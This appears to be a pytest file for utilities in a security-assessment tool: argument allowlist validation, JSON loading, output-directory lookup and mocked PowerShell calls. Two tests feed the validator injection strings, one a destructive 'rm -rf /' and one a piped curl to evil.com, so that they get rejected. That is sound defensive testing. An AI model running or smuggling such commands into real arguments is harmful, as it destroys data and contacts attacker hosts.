"""Tests for shared adapter utilities (_base.py).

Covers: validate_extra_args, load_json_file, find_latest_output_dir,
run_powershell.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from gxassessms.core.contracts.errors import CollectionError, RawOutputValidationError

# ---------------------------------------------------------------------------
# TestValidateExtraArgs
# ---------------------------------------------------------------------------


class TestValidateExtraArgs:
    """validate_extra_args allowlist enforcement."""

    @pytest.fixture(autouse=True)
    def _import(self) -> None:
        from gxassessms.adapters._base import validate_extra_args

        self.validate_extra_args = validate_extra_args

    def test_simple_flag(self) -> None:
        assert self.validate_extra_args(["-Flag"]) == ["-Flag"]

    def test_flag_with_value(self) -> None:
        assert self.validate_extra_args(["-Flag:value"]) == ["-Flag:value"]

    def test_flag_with_complex_value(self) -> None:
        assert self.validate_extra_args(["-Flag:a.b,c"]) == ["-Flag:a.b,c"]

    def test_empty_list(self) -> None:
        assert self.validate_extra_args([]) == []

    def test_rejects_shell_injection_semicolon(self) -> None:
        with pytest.raises(CollectionError):
            self.validate_extra_args(["; rm -rf /"])

    def test_rejects_pipe_injection(self) -> None:
        with pytest.raises(CollectionError):
            self.validate_extra_args(["| curl evil.com"])

    def test_rejects_no_dash(self) -> None:
        with pytest.raises(CollectionError):
            self.validate_extra_args(["foo"])

    def test_rejects_at_sign(self) -> None:
        with pytest.raises(CollectionError):
            self.validate_extra_args(["-Flag:val@ue"])

    def test_rejects_double_dash(self) -> None:
        with pytest.raises(CollectionError):
            self.validate_extra_args(["--Flag"])

    def test_first_valid_second_invalid(self) -> None:
        with pytest.raises(CollectionError):
            self.validate_extra_args(["-Good", "bad"])


# ---------------------------------------------------------------------------
# TestLoadJsonFile
# ---------------------------------------------------------------------------


class TestLoadJsonFile:
    """load_json_file with BOM handling and error paths."""

    @pytest.fixture(autouse=True)
    def _import(self) -> None:
        from gxassessms.adapters._base import load_json_file

        self.load_json_file = load_json_file

    def test_valid_json(self, tmp_path: Path) -> None:
        p = tmp_path / "data.json"
        p.write_text(json.dumps({"a": 1}), encoding="utf-8")
        assert self.load_json_file(p) == {"a": 1}

    def test_os_error_raises_validation_error(self) -> None:
        with patch(
            "pathlib.Path.read_text",
            side_effect=PermissionError("denied"),
        ):
            with pytest.raises(RawOutputValidationError, match="Cannot read") as exc_info:
                self.load_json_file(Path("/fake/file.json"))
            assert "not found" not in exc_info.value.message.lower()

    def test_empty_file(self, tmp_path: Path) -> None:
        p = tmp_path / "empty.json"
        p.write_text("", encoding="utf-8")
        with pytest.raises(RawOutputValidationError, match="empty"):
            self.load_json_file(p)

    def test_invalid_json(self, tmp_path: Path) -> None:
        p = tmp_path / "bad.json"
        p.write_text("{not json", encoding="utf-8")
        with pytest.raises(RawOutputValidationError, match="Invalid JSON"):
            self.load_json_file(p)

    def test_bom_stripped(self, tmp_path: Path) -> None:
        p = tmp_path / "bom.json"
        p.write_bytes(b"\xef\xbb\xbf" + b'{"k":"v"}')
        assert self.load_json_file(p) == {"k": "v"}


# ---------------------------------------------------------------------------
# TestFindLatestOutputDir
# ---------------------------------------------------------------------------


class TestFindLatestOutputDir:
    """find_latest_output_dir directory selection and error paths."""

    @pytest.fixture(autouse=True)
    def _import(self) -> None:
        from gxassessms.adapters._base import find_latest_output_dir

        self.find_latest_output_dir = find_latest_output_dir

    def test_returns_most_recent(self, tmp_path: Path) -> None:
        old = tmp_path / "old"
        old.mkdir()
        new = tmp_path / "new"
        new.mkdir()
        # Touch old to have an earlier mtime.
        import os
        import time

        t_old = time.time() - 100
        os.utime(old, (t_old, t_old))

        result = self.find_latest_output_dir(tmp_path)
        assert result == new

    def test_prefix_filter(self, tmp_path: Path) -> None:
        match = tmp_path / "scuba_results"
        match.mkdir()
        no_match = tmp_path / "other_dir"
        no_match.mkdir()

        result = self.find_latest_output_dir(tmp_path, prefix="scuba")
        assert result == match

    def test_missing_base_dir(self, tmp_path: Path) -> None:
        with pytest.raises(CollectionError, match="does not exist"):
            self.find_latest_output_dir(tmp_path / "nope")

    def test_no_matching_dirs(self, tmp_path: Path) -> None:
        (tmp_path / "a_dir").mkdir()
        with pytest.raises(CollectionError, match="No output directories"):
            self.find_latest_output_dir(tmp_path, prefix="zzz")

    def test_files_only_no_subdirs(self, tmp_path: Path) -> None:
        (tmp_path / "file.txt").write_text("hi")
        with pytest.raises(CollectionError, match="No output directories"):
            self.find_latest_output_dir(tmp_path)


# ---------------------------------------------------------------------------
# TestRunPowershell
# ---------------------------------------------------------------------------


class TestRunPowershell:
    """run_powershell subprocess interactions (all mocked)."""

    @pytest.fixture(autouse=True)
    def _import(self) -> None:
        from gxassessms.adapters._base import run_powershell

        self.run_powershell = run_powershell

    def _call(self, **overrides):
        defaults = {
            "script": "Get-Date",
            "arguments": None,
            "timeout_seconds": 60,
            "adapter_name": "test",
            "engagement_id": "eng-001",
        }
        defaults.update(overrides)
        return self.run_powershell(**defaults)

    @patch("gxassessms.adapters._base.subprocess.run")
    def test_oserror_raises_collection_error(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = OSError("No such file")
        with pytest.raises(CollectionError, match="not accessible") as exc_info:
            self._call()
        assert "not found" not in exc_info.value.message.lower()

    @patch("gxassessms.adapters._base.subprocess.run")
    def test_timeout_raises_collection_error(self, mock_run: MagicMock) -> None:
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="pwsh", timeout=60)
        with pytest.raises(CollectionError, match="timed out"):
            self._call()

    @patch("gxassessms.adapters._base.subprocess.run")
    def test_nonzero_exit_raises_collection_error(self, mock_run: MagicMock) -> None:
        mock_run.return_value = subprocess.CompletedProcess(
            args=["pwsh"],
            returncode=1,
            stdout=b"",
            stderr=b"Something went wrong",
        )
        with pytest.raises(CollectionError, match="code 1") as exc_info:
            self._call()
        assert "Something went wrong" in exc_info.value.message

    @patch("gxassessms.adapters._base.validate_extra_args")
    @patch("gxassessms.adapters._base.subprocess.run")
    def test_bad_extra_args(
        self,
        mock_run: MagicMock,
        mock_validate: MagicMock,
    ) -> None:
        mock_validate.side_effect = CollectionError("rejected by allowlist")
        with pytest.raises(CollectionError, match="rejected"):
            self._call(arguments=["bad"])
        mock_run.assert_not_called()
